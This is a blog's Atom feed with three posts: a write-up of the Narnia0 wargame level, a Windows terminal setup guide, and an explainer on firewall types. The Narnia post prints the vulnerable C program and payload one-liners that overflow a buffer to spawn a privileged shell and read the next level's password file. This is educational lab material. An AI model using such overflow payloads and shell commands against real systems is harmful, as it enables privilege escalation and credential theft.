<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://v1ncigod.github.io</id>
    <title>随想录</title>
    <updated>2019-09-08T12:59:58.491Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://v1ncigod.github.io"/>
    <link rel="self" href="https://v1ncigod.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://v1ncigod.github.io/images/avatar.png</logo>
    <icon>https://v1ncigod.github.io/favicon.ico</icon>
    <rights>All rights reserved 2019, 随想录</rights>
    <entry>
        <title type="html"><![CDATA[菜逼也要玩溢出之-Narnia]]></title>
        <id>https://v1ncigod.github.io/post/cai-bi-ye-yao-wan-yi-chu-zhi-narnia</id>
        <link href="https://v1ncigod.github.io/post/cai-bi-ye-yao-wan-yi-chu-zhi-narnia">
        </link>
        <updated>2019-09-08T12:14:39.000Z</updated>
        <content type="html"><![CDATA[<p>Narnia0
先贴源码</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    long val=0x41414141;
    char buf[20];

    printf(&quot;Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);
    printf(&quot;Here is your chance: &quot;);
    scanf(&quot;%24s&quot;,&amp;buf);

    printf(&quot;buf: %s\n&quot;,buf);
    printf(&quot;val: 0x%08x\n&quot;,val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system(&quot;/bin/sh&quot;);
    }
    else {
        printf(&quot;WAY OFF!!!!\n&quot;);
        exit(1);
    }

    return 0;
</code></pre>
<p>​		这道题一上来就是一道最简单的栈溢出的问题,先给Val变量传了一个四个字节(AAAA)的变量,然后给buf了一个20字节的空间,因为变量是存在栈里面的,所以遵从先进后出的原则.当给buf传入的值超过20字节的时候就会导致val的值覆盖.当val的值为0xdeadbeef的时候就会执行以Narnia0这个程序的用户的权限去运行/bin/sh命令，通过这个权限去读取/etc/narnia_pass/narnia1 获得下一关的密码。</p>
<pre><code class="language-bash">-r-sr-x--- 1 narnia1 narnia0 7456 Aug 26 22:35 narnia0
-r--r----- 1 narnia0 narnia0 1229 Aug 26 22:35 narnia0.c
</code></pre>
<p><img src="https://v1ncigod.github.io/post-images/1567945119255.png" alt=""></p>
<p>​	我们需要先明确这个系统编译器编译出来的程序运行时是选用的小端序还是大端序,小端序和大端序其实有个很简单的记法，当是正常排列顺序的时候就是大端,反向排序的时候就是小端。我们可以通过一个函数大的打印来明确是大端序还是小端序，当然也可以直接去尝试，反正两次肯定有一次是对的。使用is_bigendian()函数（C语言的，只需要printf输出就不贴源码了）结果可知，它是小端的。
​	这道题的解题payload就是</p>
<pre><code class="language-bash">cat &lt;(python -c'print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;') - | ./narnia0
</code></pre>
<p>或者</p>
<pre><code class="language-bash">(python -c'print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;';echo 'cat /etc/narnia_pass/narnia1')|/narnia/narnia0
</code></pre>
<p>​		这两个payload是有区别的，这个题有个特殊的位置，当校验val的值为0xdeadbeef的时候启动/bin/sh的时候其实启动了shell，使用payload2的时候python输出字符串的时候会在最后最后带一个截断符号表示结束（EOF），这个位置就跟PHP5作为后端用%00截断一样，当你溢出完成其实交互shell已经启动了，但是由于EOF的原因就会立马结束，所以payload2在后面使用；表示没有结束。通过；进行断句（C语言啊C语言）执行了我们通关命令。payload1就是用了一种很取巧的方式，利用bash中的重定向技巧，通过&lt; ()- 的方式获取一个交互的shell，这个方法跟反弹shell的一些命令都是利用重定向，在这个payload中，首先执行了python的输出的字符串作为.narnia0一开始的输入，然后hold住这个会话，当你输入任何语句都会被当作输入传输到narnia0执行到system(&quot;/bin/sh&quot;)中（真绕）也就实现了交互型的shell。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[windows 劲爽环境配置]]></title>
        <id>https://v1ncigod.github.io/post/windows-jing-shuang-huan-jing-pei-zhi</id>
        <link href="https://v1ncigod.github.io/post/windows-jing-shuang-huan-jing-pei-zhi">
        </link>
        <updated>2019-06-06T15:49:47.000Z</updated>
        <summary type="html"><![CDATA[<p>首先Windows被众多Mac党鄙视的就是没有一个足够好用的终端。毕竟Cmd这个玩意历史太悠久了也拥有众多的历史包袱而且Windows构建大多数应用的时候采用的是Visual Studio的一键编译所以省去了很多的可选命令行配置。当你需要写一些跨平台的应用使用Linux下的一系列工具链的时候就只能使用不好用的（不好看的）git bash，想要快速增删查改的时候Powershell又没有智能补全，而且Cmd和Powershell的默认编码还是GBK。</p>
]]></summary>
        <content type="html"><![CDATA[<p>首先Windows被众多Mac党鄙视的就是没有一个足够好用的终端。毕竟Cmd这个玩意历史太悠久了也拥有众多的历史包袱而且Windows构建大多数应用的时候采用的是Visual Studio的一键编译所以省去了很多的可选命令行配置。当你需要写一些跨平台的应用使用Linux下的一系列工具链的时候就只能使用不好用的（不好看的）git bash，想要快速增删查改的时候Powershell又没有智能补全，而且Cmd和Powershell的默认编码还是GBK。</p>
<!-- more -->
<p><img src="https://v1ncigod.github.io/post-images/1559842411168.png" alt=""></p>
<p>以上为最终的实现效果</p>
<h2 id="do-it">Do It !</h2>
<p><strong>WSL</strong></p>
<p><strong>zsh and oh-my-zsh</strong></p>
<p><strong>PowerShell Core</strong></p>
<p><strong>oh-my-posh</strong></p>
<p>网上有很多配置上面的文章，所以这里就不重述浪费时间了。</p>
<p><a href="https://segmentfault.com/a/1190000016677670">WSL+ubuntu+换源+oh-my-zsh</a></p>
<p>这篇文章不能苟同的是没有必要使用消耗性能的第三方终端模拟器。因为Windows 新推出的Powershell Core 开源 跨平台 而且功能强大（毕竟亲儿子）也可以实现美化。</p>
<p><a href="https://github.com/PowerShell/PowerShell/releases">PowerShell Core 下载</a></p>
<p><a href="https://blog.walterlv.com/post/beautify-powershell-like-zsh.html">PowerShell美化</a></p>
<p>完全按照美化教程对待PowerShell Core就ok，字体推荐<strong>DejaVu sans Mono</strong><br>
WSL 用oh-my-zsh的ys主题
PowerShell Core 使用 oh-my-posh的Honukai主题就能达成一致
最后在<strong>Visual Studio Code</strong>里面按照
<em>首选项-&gt;功能-&gt;终端-&gt;External: Windows Exec</em>
中设置好pwsh的路径（注意双//转义）就完全ok了。
后面就等着期待了两年的新Shell发布了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[安全设备简述（1）防火墙]]></title>
        <id>https://v1ncigod.github.io/post/an-quan-she-bei-jian-shu-1fang-huo-qiang</id>
        <link href="https://v1ncigod.github.io/post/an-quan-she-bei-jian-shu-1fang-huo-qiang">
        </link>
        <updated>2016-08-03T07:58:28.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="一防火墙">一.防火墙</h1>
<h2 id="1防火墙简单定义">1.防火墙简单定义</h2>
<p>常见防火墙是为了协助确保信息安全的的设备，按照特定规则，允许或是限制传输数据的通过，一般常见为硬件或者软件级防火墙，来构建网络区域。</p>
]]></summary>
        <content type="html"><![CDATA[<h1 id="一防火墙">一.防火墙</h1>
<h2 id="1防火墙简单定义">1.防火墙简单定义</h2>
<p>常见防火墙是为了协助确保信息安全的的设备，按照特定规则，允许或是限制传输数据的通过，一般常见为硬件或者软件级防火墙，来构建网络区域。</p>
 <!-- more -->
<h2 id="2防火墙类型">2.防火墙类型</h2>
<ul>
<li>网络层防火墙</li>
<li>应用层防火墙</li>
<li>代理服务</li>
</ul>
<h2 id="3实现安全策略的控制点">3.实现安全策略的控制点</h2>
<h3 id="1五元组">①五元组</h3>
<p>根据OSI模型（开放式系统互联通信参考模型）
应用层 表示层 会话层←传输层←网络层←数据链路层←物理层
<img src="http://ww2.sinaimg.cn/large/8264d223jw1f6pxuxap4mj20s90ag430.jpg" alt="五元组"></p>
<h2 id="构建了防火墙安全策略的五元组">构建了防火墙安全策略的五元组</h2>
<table>
<thead>
<tr>
<th>目的端口    原端口</th>
</tr>
</thead>
<tbody>
<tr>
<td>目的IP 原IP 协议号</td>
</tr>
<tr>
<td>目的MAC     原MAC</td>
</tr>
</tbody>
</table>
<hr>
<p>常见格式 R，U，D，dom，F
例 如：192.168.1.1 10000 TCP 121.14.88.76 80</p>
<h3 id="2访问控制列表aclacess-control-list">②访问控制列表ACL（Acess Control List）</h3>
<p>访问控制列表是一张为了实现对访问进行控制的包含了匹配关系，条件和查询语句的列表</p>
<p><strong>标准的IP访问控制列表</strong></p>
<pre><code>access-list access-list-number { permit | deny } {source [source-wildcard] | any}
</code></pre>
<p>命令解释如下:</p>
<ul>
<li>access-list：访问列表命令。</li>
<li>access-list-number：访问列表号码，值为1~99.</li>
<li>permit：允许。</li>
<li>deny：拒绝。</li>
<li>source：源IP地址。</li>
<li>source-wildcard：源IP地址的通配符。</li>
</ul>
<p><strong>扩展的IP访问控制列表</strong></p>
<pre><code>access-list access-list-number { permit | deny } { protocol \ protocol-keyword } { source [ source-wildcard ] | any } { destination destination-wildcard } | any }[protocol-specific options][log]
</code></pre>
<p>命令解释如下 :</p>
<ul>
<li>access-list-number：访问列表号码，值为100~199.</li>
<li>protocol \ protocol-keyword：可使用的协议，包括IP、ICMP、IGRP、EIGRP、OSPF等。</li>
<li>destination destination-wild：目的IP地址，格式与源IP地址相同。</li>
<li>protocol-specific options：协议制定的选项。</li>
<li>log：记录有关数据报进入访问列表的信息。</li>
</ul>
<p><strong>ACL规则的匹配原则</strong></p>
<p><img src="http://ww3.sinaimg.cn/mw690/8264d223jw1f6pydzylurj20jt08ft8y.jpg" alt="访问控制模式">
1.防火墙安全规则遵循从上到下匹配的原则，一旦有一条匹配，剩下的就不进行匹配
2.如果所有的规则都没有匹配到，数据包就丢弃
3.安全过滤规则主要包含源、目的地址和端口，TCP标志位应用实践以及一些高级过滤选项</p>
<h2 id="4防火墙的工作方式">4.防火墙的工作方式</h2>
<h3 id="1包过滤">①包过滤</h3>
<p>包过滤防火墙部署在网络的必经的链路层上，对于进入的每一个数据包（三层包）逐条去匹配安全策略ACL，直到适合某条规则，最后执行规定的动作：放行或丢弃</p>
<p>特点：</p>
<ul>
<li>优点：不设置内容缓冲区，不关心传输内容；</li>
<li>缺点：单包处理，只检查报头，前后数据包没有逻辑关系，不能发现通信插入或缺漏的数据包，也不能发现假冒的数据包，因此很容易被DDOS攻击</li>
</ul>
<h3 id="2-状态监测">② 状态监测</h3>
<p><img src="http://ww1.sinaimg.cn/large/8264d223jw1f6pye4qzt1j20kc0am3yy.jpg" alt="状态监测">
基于包检测，针对每个用户的访问链接，建立协议运用的状态跟踪（如TCP协议状态）如果不匹配时，则不转发该数据包</p>
<ul>
<li>特点：不设置内容缓冲区，不关心传输内容；
优点：建立连接状态，前后数据包有关联，可以阻止半连接的DDOS攻击；
缺点：对用户连接数量有限制，防火墙的内部缓冲区大小限制跟踪的链接数量</li>
</ul>
<h3 id="3应用代理">③应用代理</h3>
<p><img src="http://ww1.sinaimg.cn/large/8264d223jw1f6pye44tczj20jx0apmxo.jpg" alt="代理模式">
防火墙开启若干应用代理，每个代理需要一个不同的应用进程，或一个后台运行的服务程序·，对每个新的 应用必须添加针对此应用的服务程序，否则不能使用该代理的业务无法通过</p>
<p>特点：
早期防火墙就有的 技术，类似代理服务器，不做五元组检查后期防火墙在特殊场合下使用；</p>
<ul>
<li>优点：成为用户与服务器的直接连接，可以避免对服务器的直接入侵；俗称“协议落地”</li>
<li>缺点：只是应用层代理，需要与包过滤、状态过滤 技术一起使用。两边分别建立连接，设置内容缓冲区，但早期对内容不做过多的检查。该方式缓冲时间长，速度慢，延迟长</li>
</ul>
<h2 id="5性能是衡量防火墙设备的重要指标">5.性能是衡量防火墙设备的重要指标</h2>
<ul>
<li>吞吐量： 在不丢包的情况下单位时间内通过的数据包数量</li>
<li>时延 ： 数据包第一个比特进入防火墙到最后一个比特从防火墙输出的时间间隔</li>
<li>丢包率 ：通过防火墙传送时所丢数据包数量占所发送数据包的比率</li>
<li>并发连接数 ：防火墙能够 同时处理的点对点连接的最大数目（状态防火墙）</li>
<li>新建连接数 ： 在不丢包的情况下每秒可以建立的最大连接数（状态防火墙）</li>
</ul>
<h2 id="6防火墙应用于发展趋势">6.防火墙应用于发展趋势</h2>
<h3 id="1部署方式">①部署方式</h3>
<h4 id="透明模式桥模式">透明模式/桥模式</h4>
<p>内外网在一个网段内</p>
<ul>
<li>优点：直接串联到链路上，不改变原有的网络IP地址配置：</li>
<li>缺点：像玻璃一样， 屋内外一览无余；</li>
</ul>
<h4 id="网关模式">网关模式</h4>
<p>内外网在不同网段；</p>
<ul>
<li>优点：像 一道门，内外不能直接看见。此时的防火墙实现了路由转发；</li>
<li>缺点：配置网关地址，提供服务时需要做地址翻译NAT</li>
</ul>
<h3 id="防火墙采用技术">防火墙采用技术</h3>
<h4 id="1nat技术-网络地址转换-网络地址翻译">①NAT技术： 网络地址转换/ 网络地址翻译</h4>
<ul>
<li>1.内网采用私网地址时，访问互联网时需要NAT</li>
<li>2.隐藏内部网络结构。外网上的入侵者，即使监听到了用户的实际地址，也不能确定的用户的通信，也不能确定用户的实际IP地址，无法确定攻击目标。
A段 10.0.0.-10.255.255.254
B段 172.16.0.0.1 - 172.31.255.254
C段 192.168.0.1 - 192.168.255.254</li>
</ul>
<h4 id="2地址映射map">②地址映射MAP</h4>
<p>采用对内网进行映射</p>
<h4 id="3高可靠性ha">③高可靠性HA</h4>
<p>通过虚拟路由冗余协议完成可替性</p>
<h3 id="防火墙解决不了的问题">防火墙解决不了的问题</h3>
<ul>
<li>防火墙解决了网络层的访问许可，单无法判断内容是否合法
例：恶意代码可以夹带在电子邮件中
恶意代码与蠕虫通常隐藏在通信内容中
防火墙只检测包头，让夹带有攻击或病毒的“合法”内容的数据包通过，基于网络层对数据包的病毒扫描可能察觉不到横跨在多个数据包里的攻击或病毒</li>
</ul>
<h3 id="用户需要这样的防火墙">用户需要这样的防火墙</h3>
<p>在应用层进行病毒恶意代码过滤
在网络层进行规则控制</p>
<h3 id="下一代防火墙ngfw定义">下一代防火墙NGFW定义</h3>
<p>第一代防火墙对僵尸网络无能为力并且不能有效识别与阻止应用程序的泛滥
Gartner对NGFW的定义
1.标准的防火墙功能，如网络地址的转换，状态监测，VPN和大企业需要的功能
2.入侵防御系统（IPS）和防火墙一体化
3.应用程序感知能力，自动识别和控制应用程序的
4.额外的防火墙智能，为辅助决策提供更多信息，如信誉分析，与活动目录（AD）集成，有用的阻塞或漏洞列表</p>
<h3 id="ngfw新技术的核心">NGFW新技术的核心</h3>
<p>以以往的五元组变更为以用户身份定义安全策略，识别内容与应用</p>
<h3 id="utm-统一威胁管理">UTM 统一威胁管理</h3>
<p>UTM是由传统的防火墙观念进化而成，它将多种安全功能都整合在单一的产品之上，其中包括了网络防火墙，防止网络入侵（IDS），闸道器防毒（gateway antivirus，AV），反垃圾信件闸道器（gateway anti-spam），虚拟私人网络（VPN），内容过滤（content filtering），负载平衡，防止资料外泄，以及on-appliance reporting。
UTM与NGFW的区别
1.从功能上看两者差不多；
2.UTM是IDC在2004年提成，NGFW是Gartner在2009 年提出
3.UTM强调安全功能的集成，各部分独自处理，主要是解决安全运维管理问题
4.NGWF强调应用层安全，基于用户配置安全配置策略，各层安全处理高度关联，分层协同处理，提高安全效果；
5.两者的发展都基于传统安全技术积累与硬件处理能力的大幅度增强</p>
<h3 id="防火墙发展的新趋势-软件化">防火墙发展的新趋势-软件化</h3>
<p>1.把防火墙功能软件安装在一个通用的服务器里，支持一进一出两个网卡，就可以构成一台防火墙；
2.把防火墙软件部署在虚拟机里，支持两个虚拟网卡，通过外部 流量引导，把需要处理的的流量从进网卡引入，从出网口引出，就构成一台虚拟防火墙；
3.虚拟防火墙可以部署在虚拟化的 云环境中，可以动态生成，按需分配，按需定义安全策略</p>
<h3 id="防火墙的未来">防火墙的未来</h3>
<p>1.防火墙是最早的信息安全产品，是边界安全的第一安全措施最多的安全产品
2.防火墙的发展方向：处理能力高速化，检测能力智能化，部署方式软件化</p>
<h3 id="参考资料">参考资料：</h3>
<p>维基百科
i春秋安全产品原理</p>
]]></content>
    </entry>
</feed>